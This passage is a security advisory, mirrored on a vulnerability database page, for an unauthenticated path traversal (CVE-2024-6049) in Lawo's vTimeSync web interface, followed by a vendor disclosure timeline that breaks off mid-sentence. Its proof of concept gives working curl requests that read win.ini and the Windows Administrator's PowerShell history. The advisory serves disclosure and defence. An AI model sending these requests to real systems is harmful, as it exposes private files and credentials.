---
title: Lawo AG vsm LTC Time Sync Path Traversal
url: https://cxsecurity.com/issue/WLB-2024100041
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-10-29
fetch_date: 2025-10-06T18:49:13.232703
---

# Lawo AG vsm LTC Time Sync Path Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Lawo AG vsm LTC Time Sync Path Traversal** **2024.10.28**  Credit:  **[Sandro Einfeldt](https://cxsecurity.com/author/Sandro%2BEinfeldt/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-6049](https://cxsecurity.com/cveshow/CVE-2024-6049/ "Click to see CVE-2024-6049")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

SEC Consult Vulnerability Lab Security Advisory < 20241024-0 >
=======================================================================
title: Unauthenticated Path Traversal Vulnerability
product: Lawo AG - vsm LTC Time Sync (vTimeSync)
vulnerable version: <4.5.6.0
fixed version: 4.5.6.0
CVE number: CVE-2024-6049
impact: high
homepage: https://docs.lawo.com/vsm-ip-broadcast-control-system/vsmgear-user-manual/discontinued-products/vsmltc
found: 2024-01-11
by: Sandro Einfeldt
Dennis Jung
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"Lawo designs and manufactures video, audio, control and monitoring
technology for broadcast, performing arts, installed sound and corporate
applications. All products are developed in Germany and manufactured
according to highest quality standards at the company's headquarters
in the Rhine valley town of Rastatt, Germany."
Source: https://lawo.com/company/about-us/
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.
Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
The web interface of vsm LTC Time Sync (vTimeSync) is vulnerable to a path
traversal vulnerability. By sending a specially crafted HTTP request, an
unauthenticated remote attacker can download arbitrary files from the vulnerable
system. As a limitation, the exploitation is only possible if the requested file
has a file extension, e.g. .exe or .txt.
The web server is running with highest SYSTEM privileges per default, which
enables an attacker to gain access to privileged files.
Proof of concept:
-----------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
To exploit the vulnerability it is sufficient to use the following curl-command
to send a request to the vulnerable web server:
curl http://$host:8033/.../.../.../.../.../.../.../.../.../<Path to file>
For example, the following command can be used to request the default file
win.ini:
curl http://$host:8033/.../.../.../.../.../.../.../.../.../Windows/win.ini
If the application is running with SYSTEM-privileges (default), the following
command can be used to exfiltrate the Powershell history of the Windows
administrator, which might leak sensitive information:
curl http://$host:8033/.../.../.../.../.../.../.../.../.../Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost\_history.txt
Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
\* 4.4.12.0
According to the vendor, versions before 4.5 are affected and v4.5.6.0
includes the fixes.
Vendor contact timeline:
------------------------
2024-01-22: Contacting vendor through info@lawo.com; no response
2024-02-14: Contacting vendor again, adding support@lawo.com email
2024-02-15: Vendor response (support), asking for details.
2024-02-15: Asking where to submit the advisory, whether encryption
is supported.
2024-02-16: Vendor, submit either via email or JIRA; informing us
that broadcasting software security levels are not that high
as the network is usually not connected to the outside.
2024-02-16: Submitting security advisory to vendor JIRA; explaining
our severity estimation and risks by exposing the affected
service.
2024-02-20: Vendor has taken a look at the advisory, asking whether
HTTPS would solve the issue.
Telling vendor, that HTTPS won't fix the problem, describing
the security issue again, providing link to OWASP path traversal
page, etc.
2024-02-21: Vendor cannot reproduce issue in Chrome browser.
Explaining how we exploited the vulnerability.
2024-03-11: Asking for a status update; no update from R&D yet, vendor will
keep us updated.
2024-04-09: Asking for a status update, whether vendor needs further support.
2024-04-10: Vendor pinged their PM, will let us know as soon as feedback is
available.
2024-05-15: Vendor recently introduced "a login" for vTimeSync which only
lets people with a username and a PW access the page. Vendor asks
us whether this would cover the vulnerability.
2024-05-23: Telling the vendor that a login does not fix the identified
path traversal issue; no response.
2024-06-17: Asking for a status update again.
2024-06-17: Vendor support has forwarded our feedback internally.
2024-09-25: Asking for a status update, CVE and affected/fixed version number.
Preparing for release in October.
2024-09-25: Vendor support still has no updates, asking product management and
RnD team again.
2024-09-26: Asking the vendor to keep us informed.
2024-09-27: Vendor support will review the case next Wednesday.
2024-10-10: Asking for a status update.
Vendor has no news, this topic is in the R&D backlog, no date yet
when development will be started.
2024-10-11: Vendor states that the developers have already fixed the issue in
the current release.
2024-10-17: Asking for the version numbers (affected / patched).
Vendor provides download to version 4.5.6.0 including changelog.
Changelog contains information about security fix in version 4.4.13,
but also changes regarding SSL/HTTPS and logon feature in 4.5.0 and 4.5.1.
Asking the vendor again, in which version the issue has been
fixed.
Vendor informs us the problem is fixed after v4.5 and we shoul...